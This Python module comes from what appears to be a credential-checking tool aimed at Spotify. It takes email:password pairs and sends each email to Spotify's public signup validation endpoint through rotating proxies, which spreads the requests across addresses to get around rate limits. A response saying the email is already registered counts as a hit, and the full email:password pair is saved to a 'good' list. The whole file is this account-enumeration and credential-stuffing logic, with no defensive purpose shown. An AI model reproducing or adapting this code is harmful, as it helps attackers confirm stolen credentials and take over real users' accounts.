from modules.variables import Checker
from requests import get
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        try:
            r = get(f"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}",proxies=proxy_set,timeout=Checker.timeout).text
            if "That email is already registered to an account." in r:
                if not Checker.cui:
                    log("good",email,"SpotifyVM")
                save("SpotifyVM","good",Checker.time,email+":"+password)
                Checker.good += 1
                Checker.cpm += 1
                return
            elif "Enter your email to continue." in r or "status\":1" in r:
                retries += 1
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return